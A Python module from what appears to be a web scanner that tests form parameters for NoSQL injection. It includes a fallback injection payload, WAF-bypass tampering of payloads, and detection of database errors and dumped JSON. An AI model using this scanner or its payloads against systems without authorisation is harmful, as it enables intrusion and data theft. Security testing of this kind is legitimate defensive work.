import time
from .tampering import apply_tampering
import json

NOSQL_ERRORS = ["MongoError", "CastError", "Object ID", "unterminated string"]

def load_payloads():
    try:
        with open("payloads/nosqli.txt", "r") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except: 
        return ["' || '1'=='1"]

def run_nosqli_test(engine, point, param, level, bypass, waf_name=None):
    url = point['url']
    method = point['method']
    payloads = load_payloads()

    dummy_data = {param: "WAFMAP_NOSQLI_CHECK"} if method == 'POST' else None
    dummy_params = {param: "WAFMAP_NOSQLI_CHECK"} if method == 'GET' else None
    base_resp = engine._send_request(url, method=method, data=dummy_data, params=dummy_params)
    baseline_len = len(base_resp.text) if base_resp else 0

    for pay in payloads:
        final_pay = apply_tampering(pay, 'nosqli', bypass, waf_name)
        
        data = {p: 'x' for p in point['parameters']} if method=='POST' else None
        params = {p: 'x' for p in point['parameters']} if method=='GET' else None
        if method=='POST': data[param] = final_pay
        else: params[param] = final_pay

        resp = engine._send_request(url, method=method, data=data, params=params)
        
        if resp:
            for err in NOSQL_ERRORS:
                if err in resp.text:
                    engine.add_vulnerability("NoSQLi (Error)", url, final_pay, f"Erreur DB: {err}", parameter=param)
                    break

            if len(resp.text) > (baseline_len + 50):
                if "[{" in resp.text and "}]" in resp.text:
                     engine.add_vulnerability("NoSQLi (Boolean/Dump)", url, final_pay, f"Dump JSON (+{len(resp.text)-baseline_len}o)", parameter=param)
